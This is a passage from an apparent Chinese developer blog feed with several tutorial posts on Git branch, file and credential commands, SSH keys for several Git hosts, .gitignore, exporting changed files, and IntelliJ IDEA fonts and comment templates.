class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 分支管理</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="添加分支"><a href="#添加分支" class="headerlink" title="添加分支"></a>添加分支</h4><blockquote><p>git branch <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git branch test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h4><blockquote><p>git checkout <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git checkout test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="添加分支并切换"><a href="#添加分支并切换" class="headerlink" title="添加分支并切换"></a>添加分支并切换</h4><blockquote><p>git checkout -b <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git checkout -b test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看所有分支"><a href="#查看所有分支" class="headerlink" title="查看所有分支"></a>查看所有分支</h4><blockquote><p>git branch</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$ git branch* master  test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h4><blockquote><p>git branch -d <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git branch -d test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h4><p>合并到主干。</p><blockquote><p>git merge <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git merge test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="提交分支"><a href="#提交分支" class="headerlink" title="提交分支"></a>提交分支</h4><blockquote><p>git push origin <name></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git push origin test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查看分支差异"><a href="#查看分支差异" class="headerlink" title="查看分支差异"></a>查看分支差异</h4><blockquote><p>git diff <source_branch> <target_branch></p></blockquote><pre class="line-numbers language-none"><code class="language-none">git diff master test1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 提交记住用户名和密码</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E6%8F%90%E4%BA%A4%E8%AE%B0%E4%BD%8F%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E6%8F%90%E4%BA%A4%E8%AE%B0%E4%BD%8F%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>每次提交代码都要输入用户名密码，十分麻烦，教大家怎么让Git记住密码。</p><h2 id="Https记住密码"><a href="#Https记住密码" class="headerlink" title="Https记住密码"></a>Https记住密码</h2><h4 id="永久记住密码"><a href="#永久记住密码" class="headerlink" title="永久记住密码"></a>永久记住密码</h4><pre class="line-numbers language-none"><code class="language-none">git config --global credential.helper store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会在用户主目录的<code>.gitconfig</code>文件中生成下面的配置。</p><pre class="line-numbers language-none"><code class="language-none">[credential]helper &#x3D; store<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果没有<code>--global</code>，则在当前项目下的<code>.git/config</code>文件中添加。</p><p>当然，你也可以直接复制上面生成的配置到配置文件中。</p><h4 id="临时记住密码"><a href="#临时记住密码" class="headerlink" title="临时记住密码"></a>临时记住密码</h4><p>默认记住15分钟：</p><pre class="line-numbers language-none"><code class="language-none">git config –global credential.helper cache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面是自定义配置记住1小时：</p><pre class="line-numbers language-none"><code class="language-none">git config credential.helper ‘cache –timeout&#x3D;3600’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="SSH记住密码"><a href="#SSH记住密码" class="headerlink" title="SSH记住密码"></a>SSH记住密码</h2><p>可以从一个已有的SSH KEY来记住密码，会在用户主目录下的<code>known_hosts</code>生成配置。</p><h4 id="把ssh-key添加到ssh-agent"><a href="#把ssh-key添加到ssh-agent" class="headerlink" title="把ssh key添加到ssh-agent"></a>把ssh key添加到ssh-agent</h4><pre class="line-numbers language-none"><code class="language-none">$ eval $(ssh-agent -s)$ ssh-add ~&#x2F;.ssh&#x2F;id_rsa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如添加过程：</p><pre class="line-numbers language-none"><code class="language-none">$ eval $(ssh-agent -s)Agent pid 54188$ ssh-add ~&#x2F;.ssh&#x2F;id_rsaEnter passphrase for &#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa:Identity added: &#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa (&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;.ssh&#x2F;id_rsa)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个对当前会话有效，关闭窗口或者重启电脑又要重新设置，这个很蛋疼，如果有更好的解决方案的可以给我留言。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 文件操作命令</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="添加文件"><a href="#添加文件" class="headerlink" title="添加文件"></a>添加文件</h4><blockquote><p>git add</p></blockquote><p>添加指定文件：</p><pre class="line-numbers language-none"><code class="language-none">git add test.txt Test.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加所有文件：</p><pre class="line-numbers language-none"><code class="language-none">git add .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="取消添加文件"><a href="#取消添加文件" class="headerlink" title="取消添加文件"></a>取消添加文件</h4><blockquote><p>git reset HEAD – filename</p></blockquote><pre class="line-numbers language-none"><code class="language-none">git reset HEAD -- Test.java<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样Test.java将不会被提交到仓库中。</p><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><blockquote><p>git rm [–cached] fileName</p></blockquote><p>默认会取消并删除文件，<code>--cached</code>表示不删除文件。</p><h4 id="移动-重命名文件"><a href="#移动-重命名文件" class="headerlink" title="移动&#x2F;重命名文件"></a>移动&#x2F;重命名文件</h4><pre class="line-numbers language-none"><code class="language-none">git mv filename1 filename2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该文件必须被add到仓库中才能操作。</p><h4 id="查看文件提交记录"><a href="#查看文件提交记录" class="headerlink" title="查看文件提交记录"></a>查看文件提交记录</h4><blockquote><p>git log</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$ git logcommit a3eb048ca74c3881f70264de90671d95474f241e (HEAD -&gt; master, origin&#x2F;master, origin&#x2F;HEAD, javastack)Author: javastack &lt;javastack@qq.com&gt;Date:   Fri Sep 22 10:38:37 2017 +0800    commitcommit 75336d6769e79581af8aefe2a15c9b2f305064c5Author: javastack &lt;javastack@qq.com&gt;Date:   Wed Sep 20 11:19:29 2017 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 的安装配置</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="Git是什么"><a href="#Git是什么" class="headerlink" title="Git是什么"></a>Git是什么</h2><p>Git是一款免费、开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。</p><p>与常用的版本控制工具CVS、Subversion等不同的是它采用了分布式版本库的方式，不必服务器端软件支持，使源代码的发布和交流极其方便。Git的速度很快，最为出色的是它的合并跟踪的能力。</p><p>Git当初是Linus Torvalds为了帮助管理Linux内核源码替换BitKeeper 而开发的一个开放源码的版本控制软件。</p><h2 id="Git安装"><a href="#Git安装" class="headerlink" title="Git安装"></a>Git安装</h2><p>安装地址：</p><blockquote><p><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p></blockquote><p>可以在Mac OS X，Windows，Linux，Solaris这4个平台上进行安装。</p><p>安装过程略。</p><h2 id="Git配置"><a href="#Git配置" class="headerlink" title="Git配置"></a>Git配置</h2><p>配置Git上个人的用户名称和电子邮件地址，用来记录提交人的信息。</p><pre class="line-numbers language-none"><code class="language-none">$ git config --global user.name &quot;your name&quot;$ git config --global user.email &quot;your_email@youremail.com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>--global</code>：表示全局配置，配置文件用户主目录，如C:\Users\Administrator\.gitconfig<code>，如果没有这个选项只针对目前项目生效，配置文件为项目下的</code>.git&#x2F;config&#96;。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文告诉你如何导出 Git 变更文件</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/%E4%B8%80%E6%96%87%E5%91%8A%E8%AF%89%E4%BD%A0%E5%A6%82%E4%BD%95%E5%AF%BC%E5%87%BA%20Git%20%E5%8F%98%E6%9B%B4%E6%96%87%E4%BB%B6/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/%E4%B8%80%E6%96%87%E5%91%8A%E8%AF%89%E4%BD%A0%E5%A6%82%E4%BD%95%E5%AF%BC%E5%87%BA%20Git%20%E5%8F%98%E6%9B%B4%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-6-7/58683179.jpg"></p><p>有时候我们想导出某次版本提交时有哪些变更的文件，在 svn 中有一个 export 功能，很方便，如下图所示。</p><p><img src="http://img.javastack.cn/18-5-24/63533749.jpg"></p><p><strong>在 Git 中我也找到了以下两种方法。</strong></p><h4 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h4><p>使用 git 自带命令 <code>git archive</code>, 语法如下。</p><pre class="line-numbers language-none"><code class="language-none">git archive -o c:&#x2F;Users&#x2F;yourusername&#x2F;Desktop&#x2F;export.zip NewCommitId $(git diff --name-only OldCommitId NewCommitId)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用示例如下：</p><pre class="line-numbers language-none"><code class="language-none">git archive -o c:&#x2F;Users&#x2F;yourusername&#x2F;Desktop&#x2F;export.zip 479d554cf570edcc28c20ce264c6f216f8223bf3 $(git diff --name-only a838d0512e84e5eb42569cce3ef305d3ac1c44d0 479d554cf570edcc28c20ce264c6f216f8223bf3)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样会在桌面生成一个 <code>export.zip</code> 压缩包。</p><p>这个方法需要敲命令，且每次拷贝前后提交的版本号，会稍显麻烦。</p><h4 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h4><p>下载 <code>TortoiseGit</code> Git 客户端软件，使用方法和 svn 的 export 功能类似。</p><p><img src="http://img.javastack.cn/18-5-24/17828748.jpg"></p><p>很明显，方法2不用敲命令，不用拷贝提交版本号，方法2更方便，更实用！</p><p>但遗憾的是，我没有在 Source Tree 软件中找到类似的功能，需要装两个客户端，有点蛋疼。如果你知道 Source Tree 中类似的导出变更文件功能，可以在下方留言。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>推荐一个实用的 .gitignore 文件</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%AE%9E%E7%94%A8%E7%9A%84%20.gitignore%20%E6%96%87%E4%BB%B6/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%AE%9E%E7%94%A8%E7%9A%84%20.gitignore%20%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要忽略文件？"><a href="#为什么要忽略文件？" class="headerlink" title="为什么要忽略文件？"></a>为什么要忽略文件？</h3><p>常用的版本控制工具，不管是使用 git 还是 svn，我们都需要排除一些与程序代码无关的文件，如像 eclipse&#x2F; intellij idea 等 IDE 工具留下来的 <code>.settings</code>、<code>.classpath</code>、<code>.project</code>、<code>.iml</code>、<code>.idea</code> 等各种配置文件，还有 maven&#x2F; gradle 在项目构建后的 <code>target</code>、<code>classes</code> 目录下的编译文件等。</p><p>我们不能把这些本地化的无用的配置文件提交到远程仓库上面去，这样会造成别人每次都有更新的要求，也会污染别人的开发环境。</p><p><strong>本文针对使用 git 的用户进行讲解忽略文件的要点。</strong></p><h3 id="忽略配置文件介绍"><a href="#忽略配置文件介绍" class="headerlink" title="忽略配置文件介绍"></a>忽略配置文件介绍</h3><p><code>.gitignore</code> 是 Git 的忽略配置文件，放在项目根目录下就行，这样在提交代码时就不会跟踪在<code>.gitignore</code> 配置文件列举的文件。另外，<code>.gitignore</code> 文件本身需要被 git 跟踪管理，不能被忽略。</p><p>所以，如果你有时候发现不能跟踪文件了，可以使用以下命令检查是否被忽略了。</p><pre class="line-numbers language-none"><code class="language-none">$ git check-ignore .git.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>特殊情况，如果你想强制提交一个在忽略列表里面的文件，也可以使用以下命令。</p><pre class="line-numbers language-none"><code class="language-none">git add -f javastack.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更多关于 <code>.gitignore</code> 的介绍和使用可以阅读官方文档。</p><blockquote><p><a href="https://git-scm.com/docs/gitignore">https://git-scm.com/docs/gitignore</a></p></blockquote><h3 id="通用的忽略配置文件"><a href="#通用的忽略配置文件" class="headerlink" title="通用的忽略配置文件"></a>通用的忽略配置文件</h3><p>Github 也提供了各种 <code>.gitignore</code> 模板配置文件。</p><blockquote><p><a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a></p></blockquote><p><img src="http://img.javastack.cn/18-5-9/70136670.jpg"></p><p>上面是 Java 的，看上去真的非常简单，不是很全面，没有包含开发中需要忽略的各种文件。</p><p>我们提供了一个通用的比较全面的目前在使用的 <code>.gitignore</code> 文件，在我们的官方网站（<strong><a href="http://www.javastack.cn/">www.javastack.cn</a></strong>） Git 目录里面有提供。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 的这个神技，学会爽歪歪~</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E7%9A%84%E8%BF%99%E4%B8%AA%E7%A5%9E%E6%8A%80%EF%BC%8C%E5%AD%A6%E4%BC%9A%E7%88%BD%E6%AD%AA%E6%AD%AA~/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Git/Git%20%E7%9A%84%E8%BF%99%E4%B8%AA%E7%A5%9E%E6%8A%80%EF%BC%8C%E5%AD%A6%E4%BC%9A%E7%88%BD%E6%AD%AA%E6%AD%AA~/</url>
      
        <content type="html"><![CDATA[<p>现在大多数公司都有 GIT 来管理代码版本控制了，既然用到 GIT，相信大家都接触过 Github、Gitlab、Gitee 这些远程仓库，或者是公司内部自行搭建的 GIT 仓库。</p><p>当用到 SSH 方式来连接 GIT 仓库的时候，难免会同时用到多个仓库，一般生成公私钥的默认配置文件为：</p><ul><li>私钥：C:\Users\xxx.ssh\id_rsa</li><li>公钥：C:\Users\xxx.ssh\id_rsa.pub</li></ul><p>那么问题来了，我先生成 Github 的，再生成 GitLab 的，那么后面配置的 Gitlab 的公私钥文件会覆盖前面配置 Github 的，从而导致 Github 仓库无法连接。。</p><p>这样的配置只能同时连接一种类型的仓库，如何在同一台电脑做到同时连接多个不同的仓库呢？</p><h2 id="一、生成多个仓库公私钥"><a href="#一、生成多个仓库公私钥" class="headerlink" title="一、生成多个仓库公私钥"></a>一、生成多个仓库公私钥</h2><p>1、生成 Github 的：</p><blockquote><p>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:&#121;&#x6f;&#x75;&#114;&#x5f;&#x65;&#109;&#x61;&#105;&#x6c;&#x40;&#103;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;">&#121;&#x6f;&#x75;&#114;&#x5f;&#x65;&#109;&#x61;&#105;&#x6c;&#x40;&#103;&#x69;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a>“ -f ~&#x2F;.ssh&#x2F;github_id_rsa</p></blockquote><p>2、生成 Gitlab 的：</p><blockquote><p>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:&#121;&#111;&#117;&#114;&#x5f;&#101;&#x6d;&#97;&#x69;&#108;&#x40;&#x67;&#105;&#116;&#108;&#x61;&#98;&#46;&#99;&#111;&#109;">&#121;&#111;&#117;&#114;&#x5f;&#101;&#x6d;&#97;&#x69;&#108;&#x40;&#x67;&#105;&#116;&#108;&#x61;&#98;&#46;&#99;&#111;&#109;</a>“ -f ~&#x2F;.ssh&#x2F;gitlab_id_rsa</p></blockquote><p>后面有多个仓库都依此类推，用 <code>-f</code> 来指定不同的文件名称：<code>xxx_id_rsa</code>，从而区分不同的仓库类型，而不用担心被后面默认生成的覆盖。 </p><h2 id="二、将公钥添加到仓库里面"><a href="#二、将公钥添加到仓库里面" class="headerlink" title="二、将公钥添加到仓库里面"></a>二、将公钥添加到仓库里面</h2><p>复制 <code>xxx_id_rsa.pub</code> 公钥文件里面的内容到对应仓库里面，以下 Github 示例：</p><p><img src="http://img.javastack.cn/20190821105635.png"></p><h2 id="三、添加-config-配置"><a href="#三、添加-config-配置" class="headerlink" title="三、添加 config 配置"></a>三、添加 config 配置</h2><p>在 <code>~/.ssh</code> 目录下创建 <code>config</code> 文件，添加以下内容：</p><pre class="line-numbers language-none"><code class="language-none"># githubHost github.comHostName github.comPreferredAuthentications publickeyIdentityFile ~&#x2F;.ssh&#x2F;github_id_rsa# gitlabHost gitlab.comHostName gitlab.comPreferredAuthentications publickeyIdentityFile ~&#x2F;.ssh&#x2F;gitlab_id_rsa# 多个依此类推# ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、测试连通性"><a href="#四、测试连通性" class="headerlink" title="四、测试连通性"></a>四、测试连通性</h2><p>分别测试多个仓库的连通性，验证配置是否生效。</p><p>1、测试Github：</p><blockquote><p>$ ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;">&#103;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#117;&#x62;&#46;&#x63;&#111;&#109;</a></p></blockquote><p>2、测试Gitlab：</p><blockquote><p>$ ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#108;&#x61;&#98;&#46;&#99;&#111;&#x6d;">&#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#x74;&#108;&#x61;&#98;&#46;&#99;&#111;&#x6d;</a></p></blockquote><p>以下是 Github 连通示例：</p><pre class="line-numbers language-none"><code class="language-none">$ ssh -T git@github.comEnter passphrase for key &#39;&#x2F;c&#x2F;Users&#x2F;xxx&#x2F;.ssh&#x2F;github_id_rsa&#39;:Hi javastacks! You&#39;ve successfully authenticated, but GitHub does not provide shell access.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这样配置完，我们就能愉快的使用各种不同的仓库了~</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA 公司推出新字体，极度舒适~</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/IDEA%20%E5%85%AC%E5%8F%B8%E6%8E%A8%E5%87%BA%E6%96%B0%E5%AD%97%E4%BD%93%EF%BC%8C%E6%9E%81%E5%BA%A6%E8%88%92%E9%80%82~/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/IDEA%20%E5%85%AC%E5%8F%B8%E6%8E%A8%E5%87%BA%E6%96%B0%E5%AD%97%E4%BD%93%EF%BC%8C%E6%9E%81%E5%BA%A6%E8%88%92%E9%80%82~/</url>
      
        <content type="html"><![CDATA[<p>这几天炒得沸沸扬扬的 Intellij IDEA 公司 JetBrains 推出了一种新字体：<strong>JetBrains Mono</strong>，据说它是专为开发人员设计的，下面栈长带大家一起来吃个瓜。</p><p>JetBrains Mono 官方地址：</p><blockquote><p><a href="https://www.jetbrains.com/lp/mono/">https://www.jetbrains.com/lp/mono/</a></p></blockquote><p>栈长特地去了下 JetBrains Mono 官网，看起来还是挺舒适的：</p><p><img src="http://img.javastack.cn/20200120214410.png"></p><p><img src="http://img.javastack.cn/20200120214618.png"></p><p><img src="http://img.javastack.cn/20200120214720.png"></p><p>如果你说，没什么舒适不舒适的，差不多，你再来看下 <strong>JetBrains Mono</strong> 和 <strong>Consolas</strong> 这两种字体的比较，应该明清晰了：</p><p><img src="http://img.javastack.cn/20200120215003.png"><br>可以点击放大开</p><p>并且，从 2019.3 版本开始，JetBrains Mono 字体将随 JetBrains 系列 IDEs 一起提供。</p><p><img src="http://img.javastack.cn/20200120214751.png"></p><p><strong>使用方式：</strong></p><p>Preferences&#x2F;Settings → Editor → Font, 然后选择 JetBrains Mono 字体。</p><p><img src="http://img.javastack.cn/20200120222659.png"></p><p><img src="http://img.javastack.cn/20200120222919.png"></p><p>当然，你也可以在老版本的 JetBrains 系列 IDEs 或者其他 IDE 开发工具中使用它。</p><p><strong>安装方式：</strong></p><blockquote><p><a href="https://www.jetbrains.com/lp/mono/#how-to-install">https://www.jetbrains.com/lp/mono/#how-to-install</a></p></blockquote><p>有兴趣的、爱折腾的朋友们也可以尝试下哦，生活和工作这么 boring 了，总要来点新花样不是。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Intellij IDEA 最头大的问题，如何自定义注释模板？</title>
      <link href="/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E5%A4%B4%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF%EF%BC%9F/"/>
      <url>/2025/10/30/%E5%B7%A5%E5%85%B7/Intellij%20IDEA/Intellij%20IDEA%20%E6%9C%80%E5%A4%B4%E5%A4%A7%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>想栈长我当初从 Eclipse 转用 IDEA 真是纠结，放弃然后尝试了N次，不过现在已经算是转型成功了，可以完全脱离 Eclipse 撸码了，虽然说我现在真的撸得非常少了。。</p><p>说到 IDEA 的痛点，我觉得注释配置就不是很人性化。Eclipse 可以很方便的设置和导入公共的自定义注释模板、格式化模板，但在 IDEA 中确实有点蹩脚，配置起来甚至有点高级，还需要用到 Grovvy 脚本。。</p><p>废话不说了，来看下如何解决 Intellij IDEA 最头大的问题：自定义注释模板。。</p><p><strong>IDEA 中有以下两种配置模板。</strong></p><ul><li>File and Code Templates</li><li>Live Templates</li></ul><p>下面介绍下这两种的使用方法。</p><h2 id="File-and-Code-Templates"><a href="#File-and-Code-Templates" class="headerlink" title="File and Code Templates"></a>File and Code Templates</h2><p>File and Code Templates 用来配置文件和代码模板，即文件在创建的时候自动会按文件模板生成代码注释。</p><p>下面来演示一下如何自动生成 Java 类注释。</p><p>依次打开下面这个菜单：</p><blockquote><p>Editor &gt; File and Code Templates &gt; files</p></blockquote><p><img src="http://img.javastack.cn/18-10-23/68361689.jpg"></p><p>里面自带了很多文件的注释模板，只不过要自己设置，这个 class 里面的内容就是自带的，里面有一个 <code>#parse</code> 的代码。</p><pre class="line-numbers language-none"><code class="language-none">#parse(&quot;File Header.java&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个 File Header.java 哪里来的呢？</p><p>依次打开下面这个菜单：</p><blockquote><p>Editor &gt; File and Code Templates &gt; files &gt; Includes</p></blockquote><p><img src="http://img.javastack.cn/18-10-23/41018185.jpg"></p><p>其实这个 Includes 就是前面 Files 模板里面 parse 引用的片段而已。File Header 这里默认是空的，然后在这个片段里面编辑模板即可，支持一些预定义的变量，如：DATE、TIME、USER 等，上图给的是配置示例。</p><p><img src="http://img.javastack.cn/18-10-23/9061457.jpg"></p><p>从上图也可以看到，这里的模板配置用的是 Apache Velocity 模板语言，其中的 #parse 就是 Velocity 模板语言的关键字。</p><p>所以，这里的 Java 类自动生成类注释就配置完那个 File Header 就行了，配置完后，随便创建一个类就会自动带上注释。</p><p>其他的文件配置方式不再撰述。</p><h2 id="Live-Templates"><a href="#Live-Templates" class="headerlink" title="Live Templates"></a>Live Templates</h2><p>Live Templates 用来配置动态模板，可以在指定位置使用缩写字母自动生成注释。下面演示两个创建示例，手动生成类注释、方法注释。</p><p>上面演示的是创建类的时候自动添加注释，如果想手动添加类注释，怎么加？</p><p>首先打开 Live Templates 菜单：</p><blockquote><p>Editor &gt; Live Tempaltes</p></blockquote><p><img src="http://img.javastack.cn/18-10-23/56817313.jpg"></p><p>上面截图的已经配置好了 cc 和 mc，代表我输入 cc 和 mc 后会自动带出来类注释、方法注释。</p><p>右上角有个 + 号，点击选择 Live Template 添加一个动态模板，依次配置下面的内容。</p><ul><li><strong>abbreviation：</strong> 模板缩写</li><li><strong>Description：</strong> 模板描述</li><li><strong>Template Text：</strong> 模板内容</li></ul><p>Template Text 里面美元符号包起来的是变量，需要点击 <code>Edit variable</code> 按钮来设置这些变量。</p><p><img src="http://img.javastack.cn/18-10-23/85720861.jpg"></p><p>另外，就是设置模板使用的场景，如以下所示，点击 Define 链接，设置类模板只能在 Java 语言下使用。</p><p><img src="http://img.javastack.cn/18-10-23/35553716.jpg"></p><p>方法注释和类注释配置一致，配置示例如下：</p><p><img src="http://img.javastack.cn/18-10-23/59877084.jpg"></p><p><img src="http://img.javastack.cn/18-10-23/24832650.jpg"></p><p>唯一不同的是，方法里面的 params 变量需要用以下 Groovy 表达式来配置，比较麻烦。。</p><pre class="line-numbers language-none"><code class="language-none">groovyScript(&quot;def result&#x3D;&#39;&#39;; def params&#x3D;\&quot;$&#123;_1&#125;\&quot;.replaceAll(&#39;[\\\\[|\\\\]|\\\\s]&#39;, &#39;&#39;).split(&#39;,&#39;).toList(); for(i &#x3D; 0; i &lt; params.size(); i++) &#123;result+&#x3D;&#39; * @param &#39; + params[i] + ((i &lt; params.size() - 1) ? &#39;\\n&#39; : &#39;&#39;)&#125;; return result&quot;, methodParameters())<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而且方法注释这里还有一个坑，使用 mc 时不能在方法上面，要在方法里面使用，不然 @param 带出来的是 null, 而不是具体的参数名称。</p><p>好了，今天就介绍了 Intellij IDEA 如何配置文件代码模板、类和方法注释，更多的就去研究这两个菜单吧。</p><ul><li>Intellij IDEA 最常用配置详细图解</li><li>Intellij IDEA 非常6的 10 个姿势</li><li>Intellij IDEA 所有乱码解决方案</li><li>Intellij IDEA 阅读源码的 4 个绝技</li><li>Intellij IDEA Debug 